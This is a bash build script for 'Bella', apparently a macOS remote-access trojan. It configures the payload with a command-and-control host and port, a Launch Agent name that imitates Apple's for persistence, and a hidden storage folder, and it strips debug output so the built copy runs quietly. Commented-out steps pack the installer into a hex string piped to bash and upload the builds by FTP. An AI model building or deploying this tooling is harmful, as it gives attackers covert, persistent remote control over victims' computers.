#!/bin/bash
if [ $# -eq 0 ]; then
    printf "Please specify a bella server.\nUSAGE: ./BUILDER 'Bella.py'\n"
    exit 1
fi
bella=$1
bellaNoExt=${bella%.*}
BuildsPath=Builds/$(date '+%m-%d@%H_%M')
mkdir -p $BuildsPath
development=false
cp $bella $BuildsPath/bella.py
#cp Payloads/INSTALLER $BuildsPath/INSTALLER

read -p "What should the Launch Agent named? Default is [com.apple.Bella]: " launchagent
if [[ -z "$launchagent" ]]; then
	launchagent='com.apple.Bella'
fi
read -p "Where should Bella be stored in ~/Library/? Default is [Containers/.bella]: " helperLoc
if [[ -z "$helperLoc" ]]; then
 	helperLoc='Containers/.bella'
fi
read -p "Where should Bella connect to: " host
if [[ -z "$host" ]]; then
	echo -e '\033[31mYou need to enter a command and control center IP address / Domain.\033[0m'
	exit 1
fi
read -p "What port should Bella connect on [Default is 4545]: " port
if [[ -z "$port" ]]; then
	port=4545
fi

echo -e '\033[92mConfiguring your Bella installation\033[0m'
if [[ `uname` == 'Darwin' ]]; then #macOS
	sed -i '' -e "s@com.apple.Bella@$launchagent@" $BuildsPath/bella.py 
	sed -i '' -e "s@Containers/.bella@$helperLoc@" $BuildsPath/bella.py 
	sed -i '' -e "s@4545@$port@" $BuildsPath/bella.py 
	sed -i '' -e "s@127.0.0.1@$host@" $BuildsPath/bella.py
	if [ "$development" != "true" ]; then 
		sed -i '' -e "s@\(^[[:space:]]*\)\(print.*$\)@@g" $BuildsPath/bella.py
		sed -i '' -e "s@development = True@development = False@" $BuildsPath/bella.py
	fi
else   #LINUX
	sed -i "s@com.apple.Bella@$launchagent@" $BuildsPath/bella.py 
	sed -i "s@Containers/.bella@$helperLoc@" $BuildsPath/bella.py 
	sed -i "s@4545@$port@" $BuildsPath/bella.py 
	sed -i "s@127.0.0.1@$host@" $BuildsPath/bella.py
	if [ "$development" != "true" ]; then 
		sed -i "s@\(^[[:space:]]*\)\(print.*$\)@@g" $BuildsPath/bella.py
		sed -i "s@development = True@development = False@" $BuildsPath/bella.py
	fi
fi


if [ $? -eq 0 ]
then
	echo -e '\033[94mDone!\033[0m'
else
	echo -e '\033[91mError inserting config variables!\033[0m'
	exit 1
fi

echo -e '\033[92mPreparing Python code.\033[0m'
mv $BuildsPath/bella.py $BuildsPath/$bellaNoExt
echo -e '\033[94mDone!\033[0m'


#### The below is for automation of uploading to a server, and /or obfuscation. uncomment if you like.#####
#compiled. now upload bella and payloads.
#payloads_path=Payloads/payloads.txt
#read -p "Do you want to generate your own payloads, or use the pregenerated ones? [Y to build your own, N to use pregenerated] " -n 1
#if [[ ! $REPLY =~ [Yy]$ ]]
#then
#	printf '\nUsing prebuilt payloads\n'
#	payloads_path=Payloads/Prebuilt/payloads.txt
#else
#	echo
#	cd Payloads
#    ./payload_gen
#    cd ../
#    pwd
#fi
#zip -j $BuildsPath/bella.zip $BuildsPath/$bellaNoExt $payloads_path

#x=$(xxd -p $BuildsPath/INSTALLER) #hex code of the installer
#printf "echo \"$x\" | xxd -r -p | bash" > $BuildsPath/KITTEN 

#echo -ne '\033[32m'

#ftp -n ftp.ipage.com <<End-Of-Session
#user USERNAME PASSWORD
#binary
#put $BuildsPath/bella.zip bella.zip
#put $BuildsPath/INSTALLER kitten
#bye
#End-Of-Session
#echo -e '\n\033[91m\033[1mUploaded Build!\033[0m'

echo -e '\033[91mBuilt Bella is in' $BuildsPath '\033[0m'
rm $BuildsPath/$bellaNoExt.c $BuildsPath/bella.py* 2>/dev/null
